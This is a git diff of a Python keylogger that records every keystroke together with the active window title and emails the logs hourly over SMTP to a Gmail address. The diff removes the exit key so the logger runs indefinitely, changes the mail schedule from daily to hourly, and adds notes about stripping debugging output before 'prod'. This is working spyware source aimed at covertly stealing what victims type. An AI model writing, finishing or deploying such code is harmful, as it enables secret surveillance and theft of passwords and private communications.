@@ -1,5 +1,5 @@
 from logging import exception
-import pygetwindow
+import pygetwindow as gitwin
 import smtplib
 import queue
 import pynput
@@ -10,7 +10,6 @@ from datetime import datetime
 from email.message import EmailMessage
 
 f_lock = threading.Lock()
-exit_ = 0
 send_overwrite = 0
 
 
@@ -42,7 +41,7 @@ class FileManipulator:
         msg = EmailMessage()
         msg['Subject'] = f'logs ~ {datetime.now()}'
         msg['From'] = 'krunkhehehaha@gmail.com'
-        msg['To'] = 'dudethatroll360@gmail.com'
+        msg['To'] = 'krunkhehehaha@gmail.com'
         msg.set_content(content)
         return msg
 
@@ -76,7 +75,7 @@ class FileManipulator:
             #send the mail
             print("yeet mail")
             print(f'message -> {message}')
-            s.sendmail("krunkhehehaha@gmail.com", "dudethatroll360@gmail.com", message.as_string())
+            s.sendmail("krunkhehehaha@gmail.com", "krunkhehehaha@gmail.com", message.as_string())
 
             f = open("demofile.txt", "w")
             print("overwrote file")
@@ -94,12 +93,9 @@ class TheWriter:
         ###while loop to check signal on lock to reenter
         while True:
             global send_overwrite
-            global exit_
             if send_overwrite != 1:
                 print("waiting to reenter queue write")
                 FileManipulator.write_queue()
-            elif exit_ == 1:
-                break
 
 
 
@@ -111,28 +107,25 @@ class PyLoggs:
     @classmethod      #Key for spec keys or KeyCode for normal
     def on_press(cls, key, injected):
         try:
-            key_press = 'alphanumeric key {} pressed; it was {}'.format(
-                key.char, 'faked' if injected else 'not faked')
+            key_press = '{} : {} : Window : {}'.format(
+                key.char, 'faked' if injected else 'not faked', gitwin.getActiveWindowTitle())
             #adding item to end of list
             PyLoggs.keyQueue.put_nowait(key_press)
         except AttributeError:
-            key_press = 'special key {} pressed'.format(
-                key)
+            key_press = 'SK {} : Window : {}'.format(
+                key, gitwin.getActiveWindowTitle())
             #adding item to end of list
             PyLoggs.keyQueue.put_nowait(key_press)
 
 
     @classmethod
     def on_release(cls, key, injected):
-        #exit prog
-        if key == pynput.keyboard.Key.esc:
-            global exit_
-            exit_ = 1
-            global send_overwrite
-            send_overwrite = 1
+        #setting global variable to overwrite
+        global send_overwrite
+        send_overwrite = 1
         #add release to queue
-        key_release = '{} released; it was {}'.format(
-            key, 'faked' if injected else 'not faked')
+        key_release = '{} rels : {} : Window {}'.format(
+            key, 'faked' if injected else 'not faked', gitwin.getActiveWindowTitle())
         #adding item to end of list
         PyLoggs.keyQueue.put_nowait(key_release)
 
@@ -146,22 +139,16 @@ class PyLoggs:
             on_release=PyLoggs.on_release)
         my_key_lstnr.start()
 
-        #later on just do the basic esc key for prod
-        global exit_
-        while exit_ != 1:
-            time.sleep(0.5)
-        #stop listener
-        my_key_lstnr.stop()
-        print("stopping logger...")
-        time.sleep(20)#just leting io cleanup for tst
-
+        #just looping inf never will exit.
+        while True:
+            time.sleep(60)
 
 
 class timer:
     #this will call the method to overwrite and send
     #the queue dumper should see the lock exited as its waiting to reenter
     @staticmethod
-    @schedule.repeat(schedule.every().day.at("00:05"))
+    @schedule.repeat(schedule.every().hour.at(":00"))
     def send_overwrite():
         global send_overwrite
         send_overwrite = 1
@@ -200,10 +187,14 @@ if __name__ == "__main__":
 
 '''
 Current Workflow
-    > Set up conditions for waiting
-    > Then we can get to smtp
+    > Ok now we just need to take out the debugging information
+    > Set hourly (DONE)
+    > Set the exit to none.
+      > So remove the exit_ global
+      > Fix the reentry loop
 
 
 REMEMBER LATER TO ACTUALLY RESET THOSE VARIABLES
   * EASY MISTAKE TO FORGET
+  * 
 '''
